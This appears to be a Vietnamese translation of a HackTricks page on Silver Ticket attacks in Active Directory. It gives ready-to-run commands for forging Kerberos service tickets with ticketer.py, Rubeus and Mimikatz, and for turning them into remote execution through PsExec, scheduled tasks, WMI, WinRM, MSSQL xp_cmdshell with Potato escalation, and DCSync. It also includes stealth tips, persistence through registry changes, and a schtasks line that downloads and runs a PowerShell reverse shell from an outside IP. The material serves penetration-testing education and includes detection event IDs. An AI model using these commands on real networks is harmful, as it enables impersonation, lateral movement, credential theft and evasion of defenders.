# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Cuộc tấn công **Silver Ticket** khai thác service ticket trong môi trường Active Directory (AD). Phương thức này dựa vào việc **thu thập NTLM hash của tài khoản dịch vụ**, chẳng hạn như tài khoản máy tính, để giả mạo Ticket Granting Service (TGS) ticket. Với ticket giả mạo này, kẻ tấn công có thể truy cập các dịch vụ cụ thể trên mạng, **mạo danh bất kỳ người dùng nào**, thường nhằm đạt được đặc quyền quản trị. Việc dùng AES key để giả mạo ticket được xem là an toàn hơn và khó bị phát hiện hơn.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Ticket khó bị phát hiện hơn Golden Ticket vì chỉ cần **hash của tài khoản dịch vụ**, không cần tài khoản krbtgt. Tuy nhiên, chúng chỉ giới hạn ở dịch vụ cụ thể bị nhắm mục tiêu. Ngoài ra, chỉ cần đánh cắp mật khẩu của một người dùng.
Ngoài ra, nếu bạn chiếm được **mật khẩu của tài khoản có SPN**, bạn có thể dùng mật khẩu đó để tạo Silver Ticket, mạo danh bất kỳ người dùng nào khi truy cập dịch vụ đó.

### Các thay đổi Kerberos hiện đại (domain chỉ dùng AES)

- Các bản cập nhật Windows bắt đầu từ **8 Nov 2022 (KB5021131)** mặc định dùng **AES session key** cho service ticket khi có thể và đang dần loại bỏ RC4. Dự kiến đến giữa năm 2026, DC sẽ được phát hành với RC4 **bị tắt theo mặc định**, vì vậy việc dựa vào NTLM/RC4 hash để tạo silver ticket ngày càng dễ thất bại với lỗi `KRB_AP_ERR_MODIFIED`. Luôn trích xuất **AES key** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) của tài khoản dịch vụ mục tiêu.<sup>[[5]](#references)</sup>
- Nếu `msDS-SupportedEncryptionTypes` của tài khoản dịch vụ bị giới hạn ở AES, bạn phải giả mạo bằng `/aes256` hoặc `-aesKey`; RC4 (`/rc4` hoặc `-nthash`) sẽ không hoạt động ngay cả khi bạn có NTLM hash.<sup>[[6]](#references)</sup>
- Tài khoản gMSA/máy tính đổi mật khẩu 30 ngày một lần; hãy dump **AES key hiện tại** từ LSASS, Secretsdump/NTDS hoặc DCsync trước khi giả mạo.
- OPSEC: thời hạn ticket mặc định trong các công cụ thường là **10 năm**; hãy đặt thời hạn thực tế (ví dụ: `-duration 600` phút) để tránh bị phát hiện do thời hạn bất thường.<sup>[[6]](#references)</sup>

Để tạo ticket, có thể dùng các công cụ khác nhau tùy theo hệ điều hành:

### Trên Linux

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Trên Windows

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

Dịch vụ CIFS được nhấn mạnh là mục tiêu phổ biến để truy cập hệ thống tệp của nạn nhân, nhưng các dịch vụ khác như HOST và RPCSS cũng có thể bị khai thác để thực hiện các tác vụ và truy vấn WMI.

### Ví dụ: dịch vụ MSSQL (MSSQLSvc) + Potato để lên SYSTEM

Nếu bạn có NTLM hash (hoặc AES key) của tài khoản sở hữu một **SPN dịch vụ SQL chính xác đã đăng ký**, dịch vụ đó có thể chấp nhận một vé dịch vụ giả mạo. Service class và hostname trong vé phải khớp với SPN thực tế; đừng cho rằng mọi bản cài đặt đều dùng `MSSQLSvc/`. Danh tính được khai báo cũng phải ánh xạ tới một SQL login có đủ quyền để bật và chạy `xp_cmdshell`. Các lệnh `xp_cmdshell` chạy thành công sẽ chạy dưới danh tính của tiến trình dịch vụ SQL (hoặc một proxy được cấu hình cho người gọi không phải sysadmin). Hãy kiểm tra **process token** đó để xác nhận `SeImpersonatePrivilege` đang được bật trước khi cân nhắc một hướng Potato riêng; chỉ riêng cấu hình dịch vụ hoặc SPN không chứng minh được điều này.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Nếu context thu được có SeImpersonatePrivilege (thường đúng với các tài khoản dịch vụ), hãy dùng một biến thể Potato để có được quyền SYSTEM:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Thêm chi tiết về cách lạm dụng MSSQL và bật xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Tổng quan về các kỹ thuật Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Các dịch vụ hiện có

| Loại dịch vụ                              | Service Silver Tickets                                                      |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Tùy thuộc vào OS, cũng có:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Trong một số trường hợp, bạn chỉ cần yêu cầu: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Chia sẻ tệp Windows, bao gồm cả psexec      | CIFS                                                                       |
| Các thao tác LDAP, bao gồm DCSync           | LDAP                                                                       |
| Công cụ quản trị máy chủ từ xa Windows     | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Dùng **Rubeus**, bạn có thể **yêu cầu tất cả** các ticket này bằng tham số:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event ID của Silver Tickets

- 4624: Đăng nhập tài khoản
- 4634: Đăng xuất tài khoản
- 4672: Đăng nhập quản trị viên
- **Không có sự kiện 4768/4769 trước đó trên DC** cho cùng client/service là dấu hiệu phổ biến cho thấy một TGS giả mạo được trình trực tiếp cho dịch vụ.
- Thời hạn ticket dài bất thường hoặc loại mã hóa không mong đợi (RC4 khi domain áp dụng AES) cũng là những điểm đáng chú ý trong dữ liệu 4769/4624.

## Duy trì quyền truy cập

Để ngăn máy tính thay đổi mật khẩu 30 ngày một lần, hãy đặt `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` hoặc đặt `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` thành giá trị lớn hơn 30 ngày để chỉ định chu kỳ thay đổi mật khẩu của máy tính.<sup>[[3]](#references)</sup>

## Lạm dụng service ticket

Trong các ví dụ sau, hãy giả sử ticket được lấy bằng cách mạo danh tài khoản quản trị viên.

### CIFS

Với ticket này, bạn có thể truy cập thư mục `C$` và `ADMIN$` qua **SMB** (nếu chúng được chia sẻ) và sao chép tệp vào một vị trí trong hệ thống tệp từ xa bằng cách thực hiện như sau:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

Bạn cũng có thể mở shell bên trong host hoặc thực thi các lệnh tùy ý bằng **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Với quyền này, bạn có thể tạo scheduled task trên các máy tính từ xa và thực thi các lệnh tùy ý:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Với các ticket này, bạn có thể **thực thi WMI trên hệ thống nạn nhân**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Tìm **thêm thông tin về wmiexec** trên trang sau:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Với quyền truy cập winrm qua một máy tính, bạn có thể **truy cập máy đó** và thậm chí mở PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Xem trang sau để tìm hiểu **thêm các cách kết nối với máy chủ từ xa bằng winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Lưu ý rằng **winrm phải được kích hoạt và đang lắng nghe** trên máy tính từ xa để có thể truy cập.

### LDAP

Với quyền này, bạn có thể dump cơ sở dữ liệu của DC bằng **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Tìm hiểu thêm về DCSync** trên trang sau:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Cách tấn công Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Quy trình mật khẩu tài khoản máy - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + lộ trình Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Tăng cường bảo mật Kerberos & ngừng hỗ trợ RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Các tùy chọn hiện tại của Impacket ticketer.py (AES/keytab/thời hạn)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
